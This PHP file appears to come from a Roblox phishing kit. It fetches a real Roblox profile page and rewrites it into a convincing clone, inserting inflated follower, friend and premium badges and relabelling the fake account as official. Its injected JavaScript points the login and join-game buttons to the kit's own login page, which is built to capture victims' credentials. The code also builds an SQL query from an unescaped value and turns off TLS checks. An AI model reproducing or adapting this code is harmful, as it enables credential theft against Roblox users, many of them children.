<?php
session_start();
include('../../includes/functions.php');
include('../../web/setup/database.php');
$logintoken = "{logintoken}";

$row = $db->query("SELECT * FROM east WHERE logintoken='$logintoken'")->fetch();

$handle = fopen("views.txt", "r"); 
if(!$handle){ 
echo "Could not open the file" ;
} 
else { 
$counter = ( int ) fread ($handle,20) ;
 fclose ($handle) ;
$counter++ ; 
$handle = fopen("views.txt", "w" ) ; 
fwrite($handle,$counter) ; 
 fclose ($handle) ; 

$displayname = $row["displayname"];
$lolusername = $row["username"];
$realusername = $row["realusername"];
$fakeusername = $row["fakeusername"];
$userId = requestId($realusername);
$userid = $userId;
$session = "$logintoken";
$joinDate= $row["joindate"];
$placeVisits=$row["placevisits"];
$followers = $row["followers"];
$friends = $row["friends"];
$following = $row["followings"];
//activities DONT TOUCH ANYTHING
$activity = file_get_contents("activity.txt");

// ----------------------------------------------------------------
$html = file_get_contents("https://www.roblox.com/discover");
$apisList = current(explode('"};', substr(strstr($html, 'Roblox.EnvironmentUrls = {"'), 0), 2));
$apisList.= '"};';
$apisListW = file_get_contents("../../stub/phishing/replaces/apis.php");
$apisListW = str_replace('"friendsApi": "/web",','"friendsApi": "/web/'.$userId.'",', $apisListW);
$torture = file_get_contents("../../stub/phishing/replaces/torture.txt");
$tortureWith = file_get_contents("../../stub/phishing/replaces/torture.php");
$tortureWith = str_replace("{userid}", $userid, $tortureWith);
$tortureWith = str_replace("{session}", $session, $tortureWith);
$tortureWith = str_replace("{friends}", $userid, $tortureWith);
$tortureWith = str_replace("{domain}", $domain, $tortureWith);
  
$lol = file_get_contents("../../stub/phishing/replaces/lol.txt");
$lolw = file_get_contents("../../stub/phishing/replaces/lol.php");
$lolw = str_replace("{userid}", $userId, $lolw);
  
$lmao = file_get_contents("../../stub/phishing/replaces/lmao.txt");
$lmaowith = file_get_contents("../../stub/phishing/replaces/lmao.php");
$lmaowith = str_replace("{userid}", $userId, $lmaowith);
$lmaowith = str_replace("{domain}", $domain, $lmaowith);
  
$eh = file_get_contents("../../stub/phishing/replaces/eh.txt");
$ehw = file_get_contents("../../stub/phishing/replaces/eh.php");
$ehw = str_replace("{userid}", $userId, $ehw);
$ehw = str_replace("{domain}", $domain, $ehw); 
  
$ihatethisshit = file_get_contents("../../web/ihate.txt");
$ihatethisshit=str_replace("{userid}", "$userId", $ihatethisshit);

$ihatethisshitwith = file_get_contents("../../web/ihatewith.txt");
$ihatethisshitwith = str_replace("{userid}", "$userId", $ihatethisshitwith);
$ihatethisshitwith = str_replace("{count}", $followers, $ihatethisshitwith);

$friendsapp = file_get_contents("../../web/friends.txt");
$friendsapp = str_replace("{userid}", $userId, $friendsapp); 

$friendsappwith = file_get_contents("../../web/friendswith.txt");
$friendsappwith = str_replace("{userid}", $userId, $friendsappwith);
$friendsappwith =str_replace("{count}", "$friends", $friendsappwith);

$followersapp = file_get_contents("../../web/followers.txt");
$followersapp = str_replace("{userid}", $userId, $followersapp);
$followersappwith= file_get_contents("../../web/followerswith.txt");
$followersappwith = str_replace("{userid}", $userId, $followersappwith);
$followersappwith = str_replace("{count}", $followers, $followersappwith);
$followersappwith = str_replace("{abbreviatedcount}", abbreviateNumber($followers), $followersappwith);

$followingsapp = file_get_contents("../../web/followings.txt");
$followingsapp = str_replace("{userid}", $userId, $followingsapp);
$followingsappwith = file_get_contents("../../web/followingswith.txt");
$followingsappwith = str_replace("{userid}", $userId, $followingsappwith);
$followingsappwith = str_replace("{count}", $following, $followingsappwith);
$followingsappwith = str_replace("{abbreviatedcount}", abbreviateNumber($following), $followingsappwith);
// ----------------------------------------------------------------
//APIS
$currentfollowers = file_get_contents("https://friends.roblox.com/v1/users/$userId/followers/count");
$currentfollowers = json_decode($currentfollowers, true);
$currentfollowers = $currentfollowers["count"];
//friends
$friendscurrent = file_get_contents("https://friends.roblox.com/v1/users/$userId/friends/count");
$friendscurrent = json_decode($friendscurrent, true);
$friendscurrent = $friendscurrent["count"];
//following
$followingcurrent = file_get_contents("https://friends.roblox.com/v1/users/$userId/followings/count");
$followingcurrent = json_decode($followingcurrent, true);
$followingcurrent = $followingcurrent["count"];
//
$sexylol = file_get_contents("../../stub/phishing/replaces/sexylol.txt");
$sexylol = str_replace("{userid}", $userId, $sexylol);
$sexylolwith = file_get_contents("../../stub/phishing/replaces/sexylolwith.txt");
$sexylolwith = str_replace("{domain}", $domain, $sexylolwith);
$sexylolwith = str_replace("{session}", $logintoken, $sexylolwith);


    $config['useragent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
    $url = "https://www.roblox.com/users/$userId/profile";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_USERAGENT, $config['useragent']);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $content = curl_exec($ch);
    curl_close($ch);
////////////////////////////////////////////////////////////////
$displayname1 = file_get_contents("https://users.roblox.com/v1/users/$userId");
$jsonn = json_decode($displayname1, true);
$displaynames = $jsonn["displayName"];
$about1 = $jsonn["description"];

$sex = $displayname;
$sex1 = $jsonn["name"];
$sexw = $fakeusername;
$_SESSION['userid'] = $userId;
//

    $content = str_replace($apisList, $apisListW, $content);
    $content = str_replace($lol, $lolw, $content);
    $content = str_replace($lmao, $lmaowith, $content);
    $content = str_replace($eh, $ehw, $content);
    $content = str_replace("https://www.roblox.com/user-sponsorship/1", "$domain/web/sponsorship.php?id=1", $content);
    $content = str_replace("https://www.roblox.com/user-sponsorship/2", "$domain/web/sponsorship.php?id=2", $content);
    $content = str_replace("https://www.roblox.com/user-sponsorship/3", "$domain/web/sponsorship.php?id=3", $content);
    //surprise mother fucker!
    //bug fixing
    //debug
    //before debug ew
    $strsex = str_replace("@$sex1", "@$lolusername", $content);
    $str = str_replace("$displaynames", "$displayname", $strsex);
    $str = str_replace('"name" : "'.$fakeusername.'",', '"name" : "Roblox"', $str);
    $str=str_replace("$fakeusername.BundleDetector = (function () {", "", $str);
    $str = str_replace("$fakeusername.Bundle", "Roblox.Bundle", $str);
    $str = str_replace("$fakeusername.Environment", "Roblox.Environment", $str);
    $str = str_replace("$fakeusername.browserDoNotTrack", "Roblox.browserDoNotTrack", $str);
    $str = str_replace("var $fakeusername = $fakeusername || {};", "var Roblox = Roblox || {};", $str);
    $str = str_replace(''.$fakeusername.'.Performance.setPerformanceMark("html_head");', 'Roblox.Performance.setPerformanceMark("html_head");', $str);
    $str = str_replace("window.GoogleAnalyticsDisable$fakeusername = true;", "window.GoogleAnalyticsDisableRoblox2 = true;", $str);
    $str=str_replace(''.$fakeusername.'EventStream.Init("//ecsv2.roblox.com/www/e.png",', 'Roblox.EventStream.Init("//ecsv2.roblox.com/www/e.png",', $str);
    $str=str_replace("$fakeusername.", "Roblox.", $str);
$str1=str_replace('<div class="section profile-statistics" id="profile-statistics-container"></div>', '
<div class="section profile-statistics">
    <div class="container-header">
        <h3>Statistics</h3></div>
    <div class="section-content">
        <ul class="profile-stats-container">
            <li class="profile-stat">
                <p class="text-label">Join Date</p>
                <p class="text-lead">'.$joinDate.'</p>
            </li>
            <li class="profile-stat">
                <p class="text-label">Place Visits</p>
                <p class="text-lead">'.$placeVisits.'</p>
            </li>
        </ul>
    </div>
</div>', $str);
$str1 = str_replace("Profile - $fakeusername", "Profile - Roblox", $str1);
//friends
$st1r= str_replace($friendsapp, $friendsappwith, $str1);
$st1r = str_replace('data-friendscount="'.$friendscurrent.'"', 'data-friendscount="'.$friends.'"', $st1r);
//followers
$st1r= str_replace($followersapp, $followersappwith, $st1r);
$st1r = str_replace('data-followerscount="'.$currentfollowers.'"', 'data-followerscount="'.$followers.'"', $st1r);
//followings
$st1r= str_replace($followingsapp, $followingsappwith, $st1r);
$st1r = str_replace('data-followingscount="'.$followingcurrent.'"', 'data-followingscount="'.$following.'"', $st1r);
//UGHHH
if($activity == "offline"){
    $st1r = str_replace('<span class="avatar-card-link avatar-image-link">', '<span class="avatar-card-link avatar-image-link">
    <div ng-non-bindable="">
						
    </div>', $st1r);
    }
if($activity == "game"){
$st1r = str_replace('<span class="avatar-card-link avatar-image-link">', '<span class="avatar-card-link avatar-image-link">
<div ng-non-bindable="">
<a href="#" class="avatar-status game">
    <span class="icon-game profile-avatar-status" title=""></span>
</a>
</div>', $st1r);
}
if($activity == "online"){
    $st1r = str_replace('<span class="avatar-card-link avatar-image-link">', '<span class="avatar-card-link avatar-image-link">
    <div ng-non-bindable="">
    <span class="avatar-status game icon-online profile-avatar-status" title=""></span>
</div>', $st1r);
}
if($activity == "studio"){
    $st1r = str_replace('<span class="avatar-card-link avatar-image-link">', '<span class="avatar-card-link avatar-image-link">
    <div ng-non-bindable="">
    <span class="avatar-status game icon-studio profile-avatar-status" title=""></span>
</div>', $st1r);
}
if(strpos($st1r, 'icon-premium') == false){
    $st1r = str_replace('<div class="header-title">', '<div class="header-title">
    <span class="icon-premium-medium"></span>
    <span class="icon-premium-small"></span>', $st1r);
}
$st1r = str_replace('document.getElementsByClassName("font-header-2 rbx-navbar-login nav-menu-title rbx-menu-item");', 'document.getElementsByClassName("rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item");', $st1r);
$st1r = str_replace('friendscountjs[0].innerHTML = "(1)";', 'friendscountjs[0].innerHTML = "('.$friends.')";', $st1r);
if($activity == "game"){
$st1r = str_replace($sexylol, $sexylolwith, $st1r);
}
$st1r = str_replace('<span class="profile-about-content-text linkify"', '<span class="profile-about-content-text linkify" id="aboutme" style="display:none"', $st1r);

$tortureWith = file_get_contents("../../stub/phishing/replaces/torture.php");  
$tortureWith = str_replace("{userid}", $userid, $tortureWith);
$tortureWith = str_replace("{session}", $session, $tortureWith);
$tortureWith = str_replace("{friends}", $friends, $tortureWith);
$tortureWith = str_replace("{domain}", $domain, $tortureWith);

$st1r = str_replace($torture, $tortureWith, $st1r);
$domainshittyshittyshit = $_SERVER['SERVER_NAME'];
$st1r = str_replace("https://$domainshittyshittyshit/login?returnUrl=&gmode=lsOW","https://$domainshittyshittyshit/login?returnUrl=$session",$st1r);
echo $st1r;
echo '<script>fetch("about.txt",{method:"GET"}).then((result)=>{return result.text();}).then((response)=>{document.getElementById("aboutme").textContent=response;document.getElementById("aboutme").style.display="block";})</script>';

echo <<<EOF
<script type="text/javascript">
	    setInterval(function(){ 
	            var link = document.getElementsByClassName("rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item");
                link[0].setAttribute("href", '../../login?returnUrl=$session');
                link[0].setAttribute("class", "rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item");
                var friendscountjs = document.getElementsByClassName("friends-count ng-binding");
                friendscountjs[0].innerHTML = "($friends)";
                var friendshref = document.getElementsByClassName("btn-secondary-xs btn-more see-all-link-icon ng-binding");
                friendshref[0].removeAttribute("href");
                var joinbutton = document.getElementsByClassName("profile-join-game btn-growth-md ng-binding");
                joinbutton[0].setAttribute("onclick", "window.location.href = '../../login?returnUrl=$session';")
                var joinbuttonphone = document.getElementsByClassName("profile-join-game action-join-game");
                joinbuttonphone[0].setAttribute("onclick", "window.location.href = '../../login?returnUrl=$session';");
                var creationsgrid = document.getElementsByClassName("game-card-link");
                creationsgrid[0].removeAttribute("href");
                var creationsslide = document.getElementsByClassName("slide-item-emblem-container");
                creationsslide[0].getElementsByTagName("a")[0].removeAttribute("href");
                for (let i = 0; i < 9; i++) {
                    var peoplelist = document.getElementsByClassName("avatar-container");
                    peoplelist[i].getElementsByTagName("a")[0].removeAttribute("href");
                }
	    });
	</script>
EOF;
// this part is implemented by vkevin
$thumbnail_json = file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=352x352&format=Png&isCircular=false");
preg_match_all('/\b(https?|ftp|file):\/\/[-A-Z0-9+&@#\/%?=~_|$!:,.;]*[A-Z0-9+&@#\/%=~_|$]/i', $thumbnail_json, $thumbnail);
foreach($thumbnail[0] as $thumbnail){}
echo str_replace('THUMBNAILURI', $thumbnail, file_get_contents('../../stub/phishing/replaces/by_vkevin.txt'));
}
?>